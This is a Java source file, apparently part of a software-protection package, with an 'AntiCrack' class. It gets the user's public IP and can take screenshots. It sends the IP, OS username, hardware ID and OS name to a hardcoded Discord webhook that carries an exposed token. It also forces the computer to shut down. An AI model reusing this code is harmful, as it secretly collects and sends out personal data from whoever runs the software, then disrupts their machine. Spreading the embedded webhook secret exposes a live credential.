package me.protect.utils;

import java.awt.AWTException;
import java.awt.Color;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;

import javax.imageio.ImageIO;

import org.infinity.utils.ConnectUtil;

import me.protect.Protect;
import me.protect.imain.ICrack;
import me.protect.utils.discord.DiscordWebhook;

public class AntiCrack implements ICrack {

	@Override
	public String getIP() {
		String ip = "";
		try {
			ConnectUtil.httpsSertificate();
			ip = ConnectUtil.readURLToString("https://api.ipify.org/");

		} catch (Exception e) {

		}
		return ip.replaceAll("[\\\r\\\n]+", "");
	}

	@Override
	public void screenShot(String pathFile) {
		try {
			Robot robot = new Robot();
			Rectangle rectangle = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
			BufferedImage bufferedImage = robot.createScreenCapture(rectangle);
			File file = new File(pathFile);
			boolean status = ImageIO.write(bufferedImage, "png", file);
			System.out.println("Screen created " + status + " " + file.getPath());
		} catch (AWTException | IOException ex) {
			System.out.println("FUCKED");
		}

	}

	@Override
	public void discordExecute() throws IOException {
		DiscordWebhook webhook = new DiscordWebhook(
				"https://discord.com/api/webhooks/835409497575915520/uYLhGP7sliTGAp0WKYz8muoJltlArF3O6tgidZj-j4DVRk4Ccq-IAUqq2uIIsW5eIsQM");
		SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm");
		Date date = new Date();
		webhook.setUsername("Crack Killer");
		webhook.addEmbed(new DiscordWebhook.EmbedObject().setTitle("Cracker Finded").setColor(new Color(96, 204, 198))
				.addField("IP", Protect.CRACK.getIP(), true)
				.addField("PC user: ", System.getProperty("user.name"), true)
				.addField("HWID", Protect.HWID.getHWID(), true).addField("Date", formatter.format(date), false)
				.addField("OC", System.getProperty("os.name"), false));

		webhook.execute();

	}

	@Override
	public void shutdownPC() throws IOException {
		String shutdownCommand;
		String operatingSystem = System.getProperty("os.name");

		if ("Linux".equals(operatingSystem) || "Mac OS X".equals(operatingSystem)) {
			shutdownCommand = "shutdown -h now";
		} else if ("Windows".equals(operatingSystem)) {
			shutdownCommand = "shutdown -s -t 0";
		} else {
			throw new RuntimeException("Unsupported operating system.");
		}

		Runtime.getRuntime().exec(shutdownCommand);

		System.exit(1);
	}

}
